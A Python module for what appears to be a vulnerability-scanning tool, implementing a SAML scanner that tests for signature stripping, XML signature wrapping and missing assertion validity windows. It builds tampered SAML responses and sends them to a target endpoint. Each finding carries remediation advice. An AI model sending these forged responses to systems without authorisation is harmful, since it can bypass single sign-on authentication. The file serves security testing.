"""SAML signature-stripping & XML signature wrapping scanner."""
from __future__ import annotations

import base64
import hashlib
import re
import xml.etree.ElementTree as ET
from typing import Any, Dict, List

from bugwolf.scanners import Scanner
from bugwolf.scanners.live_finding import LiveFinding


SCHEMA = "bugwolf-scanner-v1"


_NS = {
    "samlp": "urn:oasis:names:tc:SAML:2.0:protocol",
    "saml": "urn:oasis:names:tc:SAML:2.0:assertion",
    "ds": "http://www.w3.org/2000/09/xmldsig#",
}


def _pid(label: str) -> str:
    return "saml-" + hashlib.sha256(label.encode()).hexdigest()[:10]


def _strip_signature(saml: str) -> str:
    """Return a SAML document with all <ds:Signature> elements removed."""
    return re.sub(
        r"<ds:Signature[\s\S]*?</ds:Signature>",
        "",
        saml,
        flags=re.IGNORECASE,
    )


def _wrap_signature(saml: str) -> str:
    """Naive signature-wrapping: duplicate the assertion, hide original."""
    insertion = "<saml:Assertion ID=\"evil\" Version=\"2.0\">wrapped</saml:Assertion>"
    return re.sub(
        r"(<samlp:Response[\s\S]*?>)",
        r"\1" + insertion,
        saml,
        count=1,
        flags=re.IGNORECASE,
    )


class SAMLScanner(Scanner):
    name = "saml"
    description = "SAML signature stripping, XSW (XML signature wrapping), and assertion replay"
    bug_class = "saml"
    default_severity = "critical"

    def matches(self, target: Dict[str, Any]) -> bool:
        return "saml" in target and isinstance(target.get("saml"), str)

    def scan(self, target: Dict[str, Any], transport) -> List[LiveFinding]:
        saml = target.get("saml", "")
        endpoint = target.get("url", target.get("endpoint", ""))
        method = target.get("method", "POST")
        findings: List[LiveFinding] = []

        stripped = _strip_signature(saml)
        if stripped != saml:
            try:
                resp = transport(method, endpoint,
                                 headers={"Content-Type": "application/saml+xml"},
                                 body=stripped)
            except Exception:
                resp = None
            if isinstance(resp, dict):
                rbody = resp.get("body") or ""
                status = resp.get("status")
                if status in (200, 201, 204, 302) and "error" not in rbody.lower():
                    findings.append(LiveFinding(
                        scanner=self.name,
                        bug_class=self.bug_class,
                        severity=self.default_severity,
                        endpoint=endpoint,
                        method=method,
                        evidence="SAML response accepted with <ds:Signature> stripped",
                        reproducer=f"{method} {endpoint}  body=<saml w/o signature>",
                        remediation="Verify XMLDSig on the canonicalised assertion, not the surrounding Response; reject unsigned assertions.",
                        payload_id=_pid("strip"),
                        extra={"status": status},
                    ))

        wrapped = _wrap_signature(saml)
        if wrapped != saml:
            try:
                resp = transport(method, endpoint,
                                 headers={"Content-Type": "application/saml+xml"},
                                 body=wrapped)
            except Exception:
                resp = None
            if isinstance(resp, dict):
                rbody = resp.get("body") or ""
                status = resp.get("status")
                if status in (200, 201, 204, 302) and "error" not in rbody.lower():
                    findings.append(LiveFinding(
                        scanner=self.name,
                        bug_class=self.bug_class,
                        severity=self.default_severity,
                        endpoint=endpoint,
                        method=method,
                        evidence="SAML XML signature-wrapping (XSW) accepted",
                        reproducer=f"{method} {endpoint}  body=<saml with duplicated assertion>",
                        remediation="Reference signature by ID and validate the same assertion that carries the claims; reject documents with multiple top-level assertions.",
                        payload_id=_pid("xsw"),
                        extra={"status": status},
                    ))

        try:
            root = ET.fromstring(saml)
        except ET.ParseError:
            root = None
        if root is not None:
            assertions = root.findall(".//saml:Assertion", _NS)
            if not assertions:
                assertions = root.findall(".//{urn:oasis:names:tc:SAML:2.0:assertion}Assertion")
            for assertion in assertions:
                cond = assertion.get("NotBefore") or assertion.get("notBefore")
                nb = assertion.get("NotOnOrAfter") or assertion.get("notOnOrAfter")
                if not cond and not nb:
                    findings.append(LiveFinding(
                        scanner=self.name,
                        bug_class=self.bug_class,
                        severity="high",
                        endpoint=endpoint,
                        method=method,
                        evidence="SAML assertion missing NotBefore/NotOnOrAfter conditions (replay window unbounded)",
                        reproducer=f"{method} {endpoint}  body=<saml w/o Conditions>",
                        remediation="Always set NotBefore and NotOnOrAfter on every SAML assertion; enforce the window server-side.",
                        payload_id=_pid("conditions"),
                        extra={"assertion_id": assertion.get("ID", "")},
                    ))
                    break
        return findings


__all__ = ["SAMLScanner"]
